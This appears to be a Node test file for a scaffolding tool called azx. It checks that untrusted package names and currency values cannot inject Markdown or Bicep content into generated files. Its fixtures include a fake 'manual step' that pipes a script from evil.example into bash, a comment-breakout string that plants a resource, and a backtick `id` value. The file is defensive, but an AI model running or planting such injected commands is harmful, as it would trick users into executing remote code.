/**
 * Untrusted display-string sinks — values azx reads from an untrusted app repo
 * (`package.json` name, `.azx/subscription.json` currency) get baked into the
 * generated README (which `ship --create-repo` commits + pushes) and a Bicep
 * `//` comment. A newline in either would inject Markdown structure or break out
 * of the single-line Bicep comment, so both are sanitized at their read boundary.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

import { resolveRepo, buildScaffold } from "../src/index.js";
import { normalizeBudget } from "../src/budget.js";

const FIXED = new Date("2024-01-01T00:00:00.000Z");

function tmpRepo(pkgName: string): string {
  const root = mkdtempSync(join(tmpdir(), "azx-untrusted-"));
  writeFileSync(join(root, "package.json"), JSON.stringify({ name: pkgName, dependencies: {} }));
  return root;
}

test("a hostile package.json name cannot inject Markdown structure into the README", () => {
  const root = tmpRepo(
    "safe-app\n\n## Required manual step\n\nRun `curl https://evil.example/x.sh | bash` first.\n",
  );
  try {
    const { intent, plan, bicep } = resolveRepo(root, { now: () => FIXED });
    // The canonical app name is collapsed to a single safe display line.
    assert.ok(!/[\r\n]/.test(intent.app.name), "app name must not contain CR/LF");

    const readme = buildScaffold(intent, plan, bicep).find((f) => f.path === "README.md")!.content;
    // No standalone injected heading — the payload can only appear inline on the `# ` title.
    assert.ok(
      !readme.split("\n").some((l) => l.trim() === "## Required manual step"),
      "must not emit an attacker-authored heading",
    );
    // azx's own attribution still leads the document body.
    const firstHeading = readme.split("\n").find((l) => l.startsWith("# "));
    assert.ok(firstHeading, "README keeps a single title line");
    assert.ok(!firstHeading!.includes("\n"), "title is one line");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("an over-long / control-laden name is truncated and cleaned, never dropped to empty", () => {
  const root = tmpRepo("A".repeat(500) + "\u0007\tB");
  try {
    const { intent } = resolveRepo(root, { now: () => FIXED });
    assert.ok(intent.app.name.length <= 80, "name is length-capped");
    assert.ok(!/[\u0000-\u001f\u007f]/.test(intent.app.name), "control chars stripped");
    assert.ok(intent.app.name.length > 0, "still non-empty");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("budget currency rejects anything that isn't a short currency token", () => {
  // Legitimate codes pass through unchanged.
  assert.equal(normalizeBudget({ currency: "EUR" }).currency, "EUR");
  assert.equal(normalizeBudget({ currency: "USD" }).currency, "USD");
  // A newline (would break out of the single-line Bicep `//` comment into code),
  // a backtick, spaces, or an over-long value all fall back to the safe default.
  assert.equal(normalizeBudget({ currency: "USD\n*/\nresource evil 'x'" }).currency, "USD");
  assert.equal(normalizeBudget({ currency: "US D" }).currency, "USD");
  assert.equal(normalizeBudget({ currency: "`id`" }).currency, "USD");
  assert.equal(normalizeBudget({ currency: "TOOLONGCURRENCY" }).currency, "USD");
  assert.equal(normalizeBudget({ currency: 42 }).currency, "USD");
});
